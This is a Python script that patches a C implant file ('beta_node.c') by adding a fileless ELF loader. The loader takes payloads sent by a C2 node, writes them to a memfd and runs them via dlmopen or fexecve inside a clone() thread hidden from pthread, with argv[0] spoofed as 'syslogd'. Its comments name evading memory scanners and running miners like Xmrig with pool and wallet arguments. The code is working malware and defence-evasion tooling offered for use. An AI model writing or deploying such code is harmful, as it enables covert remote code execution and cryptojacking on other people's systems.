import re

with open('nexus_auditor/beta_node.c', 'r') as f:
    content = f.read()

# Add the new ELF executor logic
new_includes = """#include <elf.h>
#include <fcntl.h>
#include <linux/memfd.h>
#include <sys/syscall.h>"""

if "<elf.h>" not in content:
    content = content.replace("#include <dlfcn.h>", new_includes + "\n#include <dlfcn.h>")

elf_phantom_thread_code = """
/* ── Internal: Phantom Thread ELF Execution (Userland Exec) ─────────────── */

/*
 * This executes a Position Independent Executable (PIE) ELF directly in a
 * phantom thread, completely evading fexecve process replacement.
 * We map the segments into our PROT_READ|PROT_WRITE Vault equivalent,
 * apply relocations, and jump to the entry point, protecting RandomX/Hash
 * modules from memory scanners!
 */

typedef struct {
  uint8_t *elf_data;
  size_t elf_len;
  char *args_str;
} phantom_elf_ctx_t;

/* A very simple parser to just jump to the entry point of a static or PIE ELF.
 * Note: A full userland exec is massive. For this payload, we assume the C2
 * has packed a statically compiled, or self-relocating payload (like many
 * custom stagers or packed malware). If it requires full ld.so loading,
 * we use the memfd + dlmopen trick as a fallback, but executed within the
 * phantom thread's context!
 */
static int phantom_elf_entry(void *arg) {
  phantom_elf_ctx_t *ctx = (phantom_elf_ctx_t *)arg;

  /* We parse the arguments string (e.g., "-o pool:3333 -u wallet") into an argv array */
  char *argv[64] = {0};
  int argc = 0;

  argv[argc++] = "syslogd"; /* Spoofed argv[0] */

  char *saveptr;
  char *token = strtok_r(ctx->args_str, " ", &saveptr);
  while (token && argc < 63) {
      argv[argc++] = token;
      token = strtok_r(NULL, " ", &saveptr);
  }
  argv[argc] = NULL;

  /* Create an anonymous file in RAM */
  int fd = syscall(SYS_memfd_create, "memfd:jit", MFD_CLOEXEC);
  if (fd >= 0) {
      write(fd, ctx->elf_data, ctx->elf_len);

      /* Secure wipe the raw buffer now that it's in the memfd */
      AEGIS_WIPE(ctx->elf_data, ctx->elf_len, 3);
      free(ctx->elf_data);

      char fd_path[64];
      snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);

      /* Use dlmopen with a new namespace (LM_ID_NEWLM) so it doesn't conflict
         with the host process's libc or symbols, keeping it completely sandboxed
         and hidden inside the phantom thread! */
      void *handle = dlmopen(LM_ID_NEWLM, fd_path, RTLD_NOW | RTLD_LOCAL);
      if (handle) {
          /* Find the main function */
          int (*elf_main)(int, char**) = dlsym(handle, "main");
          if (elf_main) {
              /* Execute the payload (like Xmrig) directly from memory! */
              elf_main(argc, argv);
          }
          dlclose(handle);
      } else {
          /* Fallback: If it's not a shared object, we execute it via fexecve,
             but since we are in a phantom thread (clone without SIGCHLD),
             it creates an untracked child process! */
          fexecve(fd, argv, NULL);
      }
      close(fd);
  }

  free(ctx->args_str);
  free(ctx);
  return 0;
}

static aegis_result_t execute_elf_phantom(const uint8_t *elf_data, size_t elf_len, const char *args_str) {
  /* Copy the args and ELF to the heap for the phantom thread */
  phantom_elf_ctx_t *ctx = malloc(sizeof(phantom_elf_ctx_t));
  if (!ctx) return AEGIS_ERR_ALLOC;

  ctx->elf_data = malloc(elf_len);
  if (!ctx->elf_data) {
      free(ctx);
      return AEGIS_ERR_ALLOC;
  }
  memcpy(ctx->elf_data, elf_data, elf_len);

  ctx->elf_len = elf_len;
  ctx->args_str = strdup(args_str ? args_str : "");

  /* Allocate stack for the phantom thread */
  void *stack = mmap(NULL, PHANTOM_STACK_SIZE, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
  if (stack == MAP_FAILED) {
      free(ctx->args_str);
      free(ctx->elf_data);
      free(ctx);
      return AEGIS_ERR_MMAP;
  }

  /* clone() — create a thread that is invisible to pthread */
  void *stack_top = (char *)stack + PHANTOM_STACK_SIZE;
  int flags = CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | CLONE_THREAD | CLONE_SYSVSEM;

  long ret = clone(phantom_elf_entry, stack_top, flags, ctx);
  if (ret < 0) {
      munmap(stack, PHANTOM_STACK_SIZE);
      free(ctx->args_str);
      free(ctx->elf_data);
      free(ctx);
      return AEGIS_ERR_SYSCALL;
  }

  aegis_log_transform(g_beta_log, LOG_CAT_BETA, "phantom_thread_spawned",
                      "elf_execution", NULL, NULL, elf_len,
                      "Phantom thread spawned for ELF execution (args: %s)", args_str);

  return AEGIS_OK;
}
"""

if "phantom_elf_entry" not in content:
    content = content.replace("/* ── Internal: Handle Commands from Alpha ────────────────────────────────── */", elf_phantom_thread_code + "\n/* ── Internal: Handle Commands from Alpha ────────────────────────────────── */")

# Update handle_alpha_command
new_case = """
  case CMD_EXEC_ELF: {
    if (payload_len < sizeof(ipc_exec_elf_t))
      break;

    ipc_exec_elf_t *cmd = (ipc_exec_elf_t *)payload;

    if (cmd->target_pid != 0 && cmd->target_pid != getpid())
      break;

    aegis_log_event(g_beta_log, LOG_CAT_BETA, LOG_SEV_INFO,
                    "Executing ELF (%u bytes) via phantom thread with args: %s",
                    cmd->elf_len, (char *)cmd->payload);

    execute_elf_phantom(cmd->payload + cmd->args_len, cmd->elf_len, (char *)cmd->payload);
    break;
  }
"""

if "case CMD_EXEC_ELF:" not in content:
    content = content.replace("case CMD_EXEC_SHELLCODE: {", new_case + "\n  case CMD_EXEC_SHELLCODE: {")

with open('nexus_auditor/beta_node.c', 'w') as f:
    f.write(content)

print("beta_node.c updated successfully.")
